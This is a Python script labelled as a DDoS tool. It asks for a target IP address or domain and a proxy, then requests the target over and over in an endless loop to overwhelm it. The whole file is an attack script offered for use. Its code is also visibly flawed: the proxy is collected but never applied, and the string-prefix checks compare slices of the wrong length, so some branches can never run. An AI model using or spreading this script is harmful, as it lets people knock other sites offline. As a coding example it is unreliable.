from urllib import request
from urllib.parse import unquote


print('''██████╗ ██████╗  ██████╗ ███████╗          
██╔══██╗██╔══██╗██╔═══██╗██╔════╝          
██║  ██║██║  ██║██║   ██║███████╗          
██║  ██║██║  ██║██║   ██║╚════██║          
██████╔╝██████╔╝╚██████╔╝███████║          
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝          
                                           
        ████████╗ ██████╗  ██████╗ ██╗     
        ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
           ██║   ██║   ██║██║   ██║██║     
           ██║   ██║   ██║██║   ██║██║     
           ██║   ╚██████╔╝╚██████╔╝███████╗
           ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
                                           
''')

print()
print()
print()
print()
print()
print()
print()

tries = 0
'''
url = input("Enter the IP Adress or the domain of the site you wanna DDoS: ")
print()
proxyip = input("Enter the proxy IP Adress (without port): ")
print()
proxyport = input("Insert the proxy port: ")
print()
proxy = proxyip + ":" + proxyport
target = "http://wwww." + url
'''

while True:
	print('''Enter 1 to select IP mode.
Enter 2 to select domain mode.''')
	mode = input()
	if mode == "1":
		target = input("Insert the IP Adress you want to DDoS:\n")
		proxy = "176.115.73.8:2013"
		proxyip = input("Enter the proxy IP Adress (without port):\n")
		print()
		proxyport = input("Insert the proxy port:\n")
		print()
		proxy = proxyip + ":" + proxyport
		while True:
			request.urlopen(target)
			print(tries)
			tries = tries + 1
		'''
		print("Not working!")
		print()
		<----   o   --->
		ip = input("Insert the IP Adress you want to DDoS: ")
		target = ip
		proxyip = input("Enter the proxy IP Adress (without port): ")
		print()
		proxyport = input("Insert the proxy port: ")
		print()
		proxy = proxyip + ":" + proxyport
		req = request.Request(target)
		response = request.urlopen(req)
		print(response.read().decode('utf8'))
		input()
		'''

	elif mode == "2":
		url = input("Insert the domain you want to DDoS:\n")
		if (url[0:10] == 'http://www.'):
			target = url
			proxy = "176.115.73.8:2013"
			proxyip = input("Enter the proxy IP Adress (without port):\n")
			print()
			proxyport = input("Insert the proxy port:\n")
			print()
			proxy = proxyip + ":" + proxyport
			while True:
				request.urlopen(target)
				print(tries)
				tries = tries + 1
				'''
				req = request.Request(target)
				response = request.urlopen(req)
				print(response.read().decode('utf8'))
				input()
				'''

		elif (url[0:3] == 'www.'):
			target = "http://" + url
			proxy = "176.115.73.8:2013"
			proxyip = input("Enter the proxy IP Adress (without port):\n")
			print()
			proxyport = input("Insert the proxy port:\n")
			print()
			proxy = proxyip + ":" + proxyport
			while True:
				request.urlopen(target)
				print(tries)
				tries = tries + 1
				'''
				req = request.Request(target)
				response = request.urlopen(req)
				print(response.read().decode('utf8'))
				input()
				'''

		else:
			target = "http://www." + url
			proxy = "176.115.73.8:2013"
			proxyip = input("Enter the proxy IP Adress (without port):\n")
			print()
			proxyport = input("Insert the proxy port:\n")
			print()
			proxy = proxyip + ":" + proxyport
			while True:
				request.urlopen(target)
				print(tries)
				tries = tries + 1
				'''
				req = request.Request(target)
				response = request.urlopen(req)
				print(response.read().decode('utf8'))
				input()
				'''

	else:
		print("Please enter a valid number.")
